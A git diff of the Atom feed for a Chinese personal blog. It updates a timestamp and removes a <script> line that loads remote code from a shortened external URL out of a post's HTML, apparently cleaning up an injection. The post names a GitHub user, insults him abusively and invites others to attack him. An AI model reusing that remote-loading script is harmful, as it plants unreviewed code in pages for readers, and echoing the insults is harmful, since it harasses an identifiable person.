@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://siberiaapp.github.io/siberiablog.github.io/</id>
     <title>啊么么么么么的个人博客</title>
-    <updated>2020-05-22T08:03:34.447Z</updated>
+    <updated>2020-07-15T01:33:58.518Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://siberiaapp.github.io/siberiablog.github.io/"/>
     <link rel="self" href="https://siberiaapp.github.io/siberiablog.github.io/atom.xml"/>
@@ -16,8 +16,7 @@
         <link href="https://siberiaapp.github.io/siberiablog.github.io/post/shuo-yi-xia-zai-github-shang-mou-xie-si-liao-ma-de-td-fen-zi/">
         </link>
         <updated>2020-05-22T07:54:12.000Z</updated>
-        <content type="html"><![CDATA[<script>$.require('http://wz4.in/1gnmpe');</script>
-<p>今天原本想在Github上找一下获取百度网盘直链的源码，<br>
+        <content type="html"><![CDATA[<p>今天原本想在Github上找一下获取百度网盘直链的源码，<br>
 之后发现了一个没有母亲的TD分子：<br>
 haoxuesen<br>
 欢迎祖安人们对线</p>
